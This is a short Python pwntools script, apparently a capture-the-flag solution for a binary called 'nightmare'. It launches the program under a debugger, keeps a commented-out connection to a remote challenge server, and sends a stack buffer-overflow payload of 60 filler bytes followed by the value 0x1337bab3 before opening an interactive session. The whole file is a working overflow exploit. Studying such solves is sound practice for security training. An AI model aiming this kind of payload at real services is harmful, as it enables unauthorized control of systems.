#!/usr/bin/python3
import pwn
e = pwn.context.binary = pwn.ELF("./nightmare")
p = e.debug(gdbscript="source /home/nick/global/halfdisp.py"
    +"\nbreak *main"
    +"\nc"
)

p = e.process()
#p = pwn.connect("94.237.58.211","47532")

payload=b"A"*60
payload+=pwn.p64(0x1337bab3)
p.sendline(payload)


p.interactive()
